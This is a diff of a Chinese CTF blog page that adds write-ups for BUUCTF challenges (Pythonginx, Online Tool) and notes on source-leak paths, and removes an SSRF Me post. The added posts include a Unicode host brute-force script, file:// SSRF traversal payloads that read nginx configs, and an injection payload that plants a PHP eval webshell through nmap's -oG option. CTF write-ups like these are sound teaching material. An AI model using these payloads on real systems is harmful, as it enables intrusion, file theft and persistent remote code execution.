@@ -147,7 +147,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/03/12/buu-SSRF-Me/">
+    <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/03/15/Pythonginx/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -161,7 +161,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2021/03/12/buu-SSRF-Me/" class="post-title-link" itemprop="url">buu-SSRF.Me</a>
+            <a href="/2021/03/15/Pythonginx/" class="post-title-link" itemprop="url">Pythonginx</a>
         </h2>
 
         <div class="post-meta">
@@ -172,7 +172,7 @@
               <span class="post-meta-item-text">Posted on</span>
               
 
-              <time title="Created: 2021-03-12 17:50:12 / Modified: 19:47:53" itemprop="dateCreated datePublished" datetime="2021-03-12T17:50:12+08:00">2021-03-12</time>
+              <time title="Created: 2021-03-15 20:31:21 / Modified: 21:13:11" itemprop="dateCreated datePublished" datetime="2021-03-15T20:31:21+08:00">2021-03-15</time>
             </span>
 
           
@@ -186,16 +186,154 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p>SSRF漏洞的简述<br>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。</p>
-<p>SSRF 形成的原因：大都是由于服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，文档，等等。</p>
-<p>也就是说，对于为服务器提供服务的其他应用没有对访问进行限制，如果我构造好我的访问包，那我就有可能利用目标服务对他的其他服务器应用进行调用。</p>
-<p>一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）。</p>
-<p>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39190897/article/details/88226410">https://blog.csdn.net/weixin_39190897/article/details/88226410</a></p>
-<h2 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2><p>hint:  flag is in ./flag.txt</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">#encoding&#x3D;utf-8</span><br><span class="line">from flask import Flask</span><br><span class="line">from flask import request</span><br><span class="line">import socket</span><br><span class="line">import hashlib</span><br><span class="line">import urllib</span><br><span class="line">import sys</span><br><span class="line">import os</span><br><span class="line">import json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(&#39;latin1&#39;)</span><br><span class="line"></span><br><span class="line">app &#x3D; Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key &#x3D; os.urandom(16)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Task:  &#x2F;&#x2F;Task类</span><br><span class="line">    def __init__(self, action, param, sign, ip):&#x2F;&#x2F;python的构造方法</span><br><span class="line">        self.action &#x3D; action</span><br><span class="line">        self.param &#x3D; param</span><br><span class="line">        self.sign &#x3D; sign</span><br><span class="line">        self.sandbox &#x3D; md5(ip)</span><br><span class="line">        if(not os.path.exists(self.sandbox)):          &#x2F;&#x2F;SandBox For Remote_Addr</span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    def Exec(self):  &#x2F;&#x2F;定义的命令执行函数，此处调用了scan这个自定义的函数</span><br><span class="line">        result &#x3D; &#123;&#125;      &#x2F;&#x2F;Exec：检查cookie中的action，如果scan在action中，将param的文件内容写入result.txt，如果read在action中，读出result.txt 的内容</span><br><span class="line">        result[&#39;code&#39;] &#x3D; 500</span><br><span class="line">        if (self.checkSign()):</span><br><span class="line">            if &quot;scan&quot; in self.action:  &#x2F;&#x2F;action要写scan</span><br><span class="line">                tmpfile &#x3D; open(&quot;.&#x2F;%s&#x2F;result.txt&quot; % self.sandbox, &#39;w&#39;)</span><br><span class="line">                resp &#x3D; scan(self.param)   &#x2F;&#x2F; 此处是文件读取的注入点</span><br><span class="line">                if (resp &#x3D;&#x3D; &quot;Connection Timeout&quot;):</span><br><span class="line">                    result[&#39;data&#39;] &#x3D; resp</span><br><span class="line">                else:</span><br><span class="line">                    print resp   &#x2F;&#x2F;输出结果</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[&#39;code&#39;] &#x3D; 200</span><br><span class="line">            if &quot;read&quot; in self.action:   &#x2F;&#x2F;action要加read</span><br><span class="line">                f &#x3D; open(&quot;.&#x2F;%s&#x2F;result.txt&quot; % self.sandbox, &#39;r&#39;)</span><br><span class="line">                result[&#39;code&#39;] &#x3D; 200</span><br><span class="line">                result[&#39;data&#39;] &#x3D; f.read()</span><br><span class="line">            if result[&#39;code&#39;] &#x3D;&#x3D; 500:</span><br><span class="line">                result[&#39;data&#39;] &#x3D; &quot;Action Error&quot;</span><br><span class="line">        else:</span><br><span class="line">            result[&#39;code&#39;] &#x3D; 500</span><br><span class="line">            result[&#39;msg&#39;] &#x3D; &quot;Sign Error&quot;</span><br><span class="line">        return result</span><br><span class="line"></span><br><span class="line">    def checkSign(self):  &#x2F;&#x2F;checkSign：检查cookie中的sign</span><br><span class="line">        if (getSign(self.action, self.param) &#x3D;&#x3D; self.sign):   </span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#generate Sign For Action Scan.</span><br><span class="line">@app.route(&quot;&#x2F;geneSign&quot;, methods&#x3D;[&#39;GET&#39;, &#39;POST&#39;])    &#x2F;&#x2F;这个路由用于测试</span><br><span class="line">def geneSign():    &#x2F;&#x2F;   &#x2F;geneSign获得url中parma参数，通过getSign(action, param)生成摘要</span><br><span class="line">    param &#x3D; urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) </span><br><span class="line">    action &#x3D; &quot;scan&quot;</span><br><span class="line">    return getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;De1ta&#39;,methods&#x3D;[&#39;GET&#39;,&#39;POST&#39;])   &#x2F;&#x2F;这个路由最终注入点</span><br><span class="line">def challenge():             &#x2F;&#x2F;   &#x2F;De1ta获得cookie中的action和sign，waf(param),创建task对象，调用exce()方法，json格式返回</span><br><span class="line">    action &#x3D; urllib.unquote(request.cookies.get(&quot;action&quot;))</span><br><span class="line">    param &#x3D; urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))</span><br><span class="line">    sign &#x3D; urllib.unquote(request.cookies.get(&quot;sign&quot;))</span><br><span class="line">    ip &#x3D; request.remote_addr</span><br><span class="line">    if(waf(param)):</span><br><span class="line">        return &quot;No Hacker!!!!&quot;</span><br><span class="line">    task &#x3D; Task(action, param, sign, ip)</span><br><span class="line">    return json.dumps(task.Exec())</span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;&#39;)   &#x2F;&#x2F;根目录路由，就是显示源代码的地方</span><br><span class="line">def index():</span><br><span class="line">    return open(&quot;code.txt&quot;,&quot;r&quot;).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def scan(param):   &#x2F;&#x2F;这是用来扫目录的函数</span><br><span class="line">    socket.setdefaulttimeout(1)</span><br><span class="line">    try:</span><br><span class="line">        return urllib.urlopen(param).read()[:50]</span><br><span class="line">    except:</span><br><span class="line">        return &quot;Connection Timeout&quot;</span><br><span class="line"></span><br><span class="line">def getSign(action, param):   &#x2F;&#x2F;这个应该是本题关键点,此处注意顺序先是param后是action</span><br><span class="line">    return hashlib.md5(secert_key + param + action).hexdigest()&#x2F;&#x2F;返回secert_key + param + action的哈希值</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def md5(content):</span><br><span class="line">    return hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def waf(param):   &#x2F;&#x2F;过滤了gopher和file协议</span><br><span class="line">    check&#x3D;param.strip().lower()</span><br><span class="line">    if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;):</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    app.debug &#x3D; False</span><br><span class="line">    app.run(host&#x3D;&#39;0.0.0.0&#39;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>param和action是可控参数，但是secert_key是未知的，但是好巧不巧，之前分析过的第一个路由就恰巧调用了这个getSign的方法，并且有return值</p>
-<p>构造payload:</p>
-<pre><code>/geneSign?param=</code></pre>
+          <h2 id="buu-SUCTF-2019-Pythonginx"><a href="#buu-SUCTF-2019-Pythonginx" class="headerlink" title="buu-[SUCTF 2019]Pythonginx"></a>buu-[SUCTF 2019]Pythonginx</h2><p>源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&#39;&#x2F;getUrl&#39;, methods&#x3D;[&#39;GET&#39;, &#39;POST&#39;])</span><br><span class="line">def getUrl():</span><br><span class="line">    url &#x3D; request.args.get(&quot;url&quot;)</span><br><span class="line">    host &#x3D; parse.urlparse(url).hostname</span><br><span class="line">    if host &#x3D;&#x3D; &#39;suctf.cc&#39;:</span><br><span class="line">        return &quot;我扌 your problem? 111&quot;</span><br><span class="line">    parts &#x3D; list(urlsplit(url))</span><br><span class="line">    host &#x3D; parts[1]</span><br><span class="line">    if host &#x3D;&#x3D; &#39;suctf.cc&#39;:</span><br><span class="line">        return &quot;我扌 your problem? 222 &quot; + host</span><br><span class="line">    newhost &#x3D; []</span><br><span class="line">    for h in host.split(&#39;.&#39;):</span><br><span class="line">        newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;))</span><br><span class="line">    parts[1] &#x3D; &#39;.&#39;.join(newhost)</span><br><span class="line">    #去掉 url 中的空格</span><br><span class="line">    finalUrl &#x3D; urlunsplit(parts).split(&#39; &#39;)[0]</span><br><span class="line">    host &#x3D; parse.urlparse(finalUrl).hostname</span><br><span class="line">    if host &#x3D;&#x3D; &#39;suctf.cc&#39;:</span><br><span class="line">        return urllib.request.urlopen(finalUrl).read()</span><br><span class="line">    else:</span><br><span class="line">        return &quot;我扌 your problem? 333&quot;</span><br></pre></td></tr></table></figure>
+<p>大佬说：这道题用的是blackhat议题之一HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization，</p>
+<p>这个题的代码说：提交一个url，前两个if不同，第三个相同，host构造方法不同，但要都等于</p>
+<pre><code>suctf.cc</code></pre>
+<p>这也是议题要说明的：当URL 中出现一些特殊字符的时候，输出的结果可能不在预期(选择替换最后一个字符c)</p>
+<p>接着我们只需要按照getUrl函数写出爆破脚本即可得到我们能够逃逸的构造语句了</p>
+<p>偷大佬的脚本：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">from urllib.parse import urlparse,urlunsplit,urlsplit</span><br><span class="line">from urllib import parse</span><br><span class="line">def get_unicode():</span><br><span class="line">    for x in range(65536):</span><br><span class="line">        uni&#x3D;chr(x)</span><br><span class="line">        url&#x3D;&quot;http:&#x2F;&#x2F;suctf.c&#123;&#125;&quot;.format(uni)&#x2F;&#x2F;最后一个c</span><br><span class="line">        try:</span><br><span class="line">            if getUrl(url):</span><br><span class="line">                print(&quot;str: &quot;+uni+&#39; unicode: \\u&#39;+str(hex(x))[2:])</span><br><span class="line">        except:</span><br><span class="line">            pass</span><br><span class="line"> </span><br><span class="line">def getUrl(url):</span><br><span class="line">    url&#x3D;url</span><br><span class="line">    host&#x3D;parse.urlparse(url).hostname</span><br><span class="line">    if host &#x3D;&#x3D; &#39;suctf.cc&#39;:</span><br><span class="line">        return False</span><br><span class="line">    parts&#x3D;list(urlsplit(url))</span><br><span class="line">    host&#x3D;parts[1]</span><br><span class="line">    if host &#x3D;&#x3D; &#39;suctf.cc&#39;:</span><br><span class="line">        return False</span><br><span class="line">    newhost&#x3D;[]</span><br><span class="line">    for h in host.split(&#39;.&#39;):</span><br><span class="line">        newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;))</span><br><span class="line">    parts[1]&#x3D;&#39;.&#39;.join(newhost)</span><br><span class="line">    finalUrl&#x3D;urlunsplit(parts).split(&#39; &#39;)[0]</span><br><span class="line">    host&#x3D;parse.urlparse(finalUrl).hostname</span><br><span class="line">    if host &#x3D;&#x3D; &#39;suctf.cc&#39;:</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">if __name__&#x3D;&#x3D;&#39;__main__&#39;:</span><br><span class="line">    get_unicode()</span><br></pre></td></tr></table></figure>
+<p>运行得</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">str: ℂ unicode: \u2102</span><br><span class="line">str: ℭ unicode: \u212d</span><br><span class="line">str: Ⅽ unicode: \u216d</span><br><span class="line">str: ⅽ unicode: \u217d</span><br><span class="line">str: Ⓒ unicode: \u24b8</span><br><span class="line">str: ⓒ unicode: \u24d2</span><br><span class="line">str: Ｃ unicode: \uff23</span><br><span class="line">str: ｃ unicode: \uff43</span><br></pre></td></tr></table></figure>
+<p>题目提示nginx，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">配置文件存放目录：&#x2F;etc&#x2F;nginx</span><br><span class="line">主配置文件：&#x2F;etc&#x2F;nginx&#x2F;conf&#x2F;nginx.conf</span><br><span class="line">管理脚本：&#x2F;usr&#x2F;lib64&#x2F;systemd&#x2F;system&#x2F;nginx.service</span><br><span class="line">模块：&#x2F;usr&#x2F;lisb64&#x2F;nginx&#x2F;modules</span><br><span class="line">应用程序：&#x2F;usr&#x2F;sbin&#x2F;nginx</span><br><span class="line">程序默认存放位置：&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html</span><br><span class="line">日志默认存放位置：&#x2F;var&#x2F;log&#x2F;nginx</span><br><span class="line">配置文件目录为：&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf</span><br></pre></td></tr></table></figure>
+<p>尝试读nginx的配置文件</p>
+<pre><code>?url=file://suctf.c%E2%84%82/../../../../..//usr/local/nginx/conf/nginx.conf</code></pre>
+<p>读到了flag的位置：/usr/fffffflag</p>
+<pre><code>?url=file://suctf.c%E2%84%82/../../../../..//usr/fffffflag</code></pre>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/03/15/buu33-40/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="六公子买单">
+      <meta itemprop="description" content="一头努力的菜鸟">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Daq1ang">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/03/15/buu33-40/" class="post-title-link" itemprop="url">buu33-40</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2021-03-15 19:50:36 / Modified: 20:25:15" itemprop="dateCreated datePublished" datetime="2021-03-15T19:50:36+08:00">2021-03-15</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="BUUCTF 2018 Online Tool"></a>BUUCTF 2018 Online Tool</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) &#123;</span><br><span class="line">    $_SERVER[&#39;REMOTE_ADDR&#39;] &#x3D; $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;];  &#x2F;&#x2F;服务器获取ip</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!isset($_GET[&#39;host&#39;])) &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $host &#x3D; $_GET[&#39;host&#39;];</span><br><span class="line">    $host &#x3D; escapeshellarg($host);</span><br><span class="line">    $host &#x3D; escapeshellcmd($host);</span><br><span class="line">    $sandbox &#x3D; md5(&quot;glzjin&quot;. $_SERVER[&#39;REMOTE_ADDR&#39;]);</span><br><span class="line">    echo &#39;you are in sandbox &#39;.$sandbox;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>关于escapeshellarg()和escapeshellcmd()函数的解释：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.传入的参数是：172.17.0.2&#39; -v -d a&#x3D;1</span><br><span class="line"></span><br><span class="line">2.经过escapeshellarg处理后变成了&#39;172.17.0.2&#39;\&#39;&#39; -v -d a&#x3D;1&#39;，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</span><br><span class="line"></span><br><span class="line">3.经过escapeshellcmd处理后变成&#39;172.17.0.2&#39;\\&#39;&#39; -v -d a&#x3D;1\&#39;，这是因为escapeshellcmd对\以及最后那个不配对儿的引号进行了转义：http:&#x2F;&#x2F;php.net&#x2F;manual&#x2F;zh&#x2F;function.escapeshellcmd.php</span><br><span class="line"></span><br><span class="line">4.最后执行的命令是curl &#39;172.17.0.2&#39;\\&#39;&#39; -v -d a&#x3D;1\&#39;，由于中间的\\被解释为\而不再是转义字符，所以后面的&#39;没有被转义，与再后面的&#39;配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d a&#x3D;1&#39;，即向172.17.0.2\发起请求，POST 数据为a&#x3D;1&#39;。</span><br></pre></td></tr></table></figure>
+<p>map命令-oG将一个命令写入到自己指定的文件中，最终payload:</p>
+<pre><code>?host=&#39; &lt;?php eval($_POST[&quot;v&quot;]);?&gt; -oG shell.php &#39;</code></pre>
+<p>1.如果两边不加但引号，则执行后变成：</p>
+<pre><code>&#39;&lt;?php eval($_POST[&quot;v&quot;]);?&gt; -oG shell.php&#39;</code></pre>
+<p>不是命令，而是一个字符串，因为在解析单引号的时候 , 被单引号包裹的内容中如果有变量 , 这个变量名是不会被解析成值的，但是双引号不同 , bash 会将变量名解析成变量的值再使用。</p>
+<p>2.引号旁边加空格是因为，如果不加，当两个函数执行并echo出来后就会变成：</p>
+<pre><code>\&lt;?php eval($_POST[&quot;v&quot;]);?&gt; -oG shell.php\\</code></pre>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/03/15/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="六公子买单">
+      <meta itemprop="description" content="一头努力的菜鸟">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Daq1ang">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/03/15/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="post-title-link" itemprop="url">信息收集</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2021-03-15 17:00:58 / Modified: 18:13:30" itemprop="dateCreated datePublished" datetime="2021-03-15T17:00:58+08:00">2021-03-15</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="svn泄露"><a href="#svn泄露" class="headerlink" title="svn泄露"></a>svn泄露</h2><p>SVN（subversion）是源代码版本管理软件。 在使用SVN管理本地代码过程中，会自动生成一个隐藏文件夹，其中包含重要的源代码信息。但一些网站管理员在发布代码时，不愿意使用‘导出’功能，而是直接复制代码文件夹到WEB服务器上，这就使隐藏文件夹被暴露于外网环境，这使得渗透工程师可以借助其中包含版本信息追踪的网站文件，逐步摸清站点结构。 在服务器上布署代码时。如果是使用 svn checkout 功能来更新代码，而没有配置好目录访问权限，则会存在此漏洞。黑客利用此漏洞，可以下载整套网站的源代码。</p>
+<pre><code>/.svn/</code></pre>
+<hr>
+<h2 id="vim的缓存泄露"><a href="#vim的缓存泄露" class="headerlink" title="vim的缓存泄露"></a>vim的缓存泄露</h2><p>vim编辑文本时会创建一个临时文件，如果程序正常退出，临时文件自动删除，如果意外退出就会保留，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容。而本题的情景就是电脑死机了意外退出，导致存在临时文件</p>
+<pre><code>/index.php.swp</code></pre>
 
       
     </div>
@@ -246,7 +384,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-03-12 20:40:37" itemprop="dateModified" datetime="2021-03-12T20:40:37+08:00">2021-03-12</time>
+                <time title="Modified: 2021-03-15 19:47:15" itemprop="dateModified" datetime="2021-03-15T19:47:15+08:00">2021-03-15</time>
               </span>
 
           
@@ -305,7 +443,7 @@ auto_prepend_file=test.jpg</code></pre>
 <pre><code>&lt;script&gt;window.location.replace(&#39;./levels91.php&#39;)&lt;/script&gt;</code></pre>
 <p>访问/levels91.php</p>
 <p>$a != $b &amp;&amp; md5($a) == md5($b)  php弱类型比较</p>
-<p>a[]=1&amp;b[]2绕过</p>
+<p>a[]=1&amp;b[]=2绕过</p>
 <hr>
 <h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>用字符串截断函数，把每个字符截断出来。如果当前字符等于某个字符，返回1，否则返回2。</p>
 <p>比如: 截取到了flag中的第一个字符f时，从ascii码表里爆破 ， f =a 返回 2 ， f = f 返回1</p>
@@ -956,241 +1094,6 @@ $user-&gt;update_profile($username, serialize($profile));</code></pre>
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/01/31/buu-Warmup/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="六公子买单">
-      <meta itemprop="description" content="一头努力的菜鸟">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Daq1ang">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/01/31/buu-Warmup/" class="post-title-link" itemprop="url">buu-Warmup</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2021-01-31 17:28:53 / Modified: 18:19:47" itemprop="dateCreated datePublished" datetime="2021-01-31T17:28:53+08:00">2021-01-31</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="根据题目得到代码如下，开始代码审计"><a href="#根据题目得到代码如下，开始代码审计" class="headerlink" title="根据题目得到代码如下，开始代码审计"></a>根据题目得到代码如下，开始代码审计</h2><pre><code>&lt;?php
-    highlight_file(__FILE__);
-class emmm
-&#123;
-    public static function checkFile(&amp;$page)
-    &#123;
-        $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];
-        //得到另外一个文件hint.php，包含得到flag的文件名
-
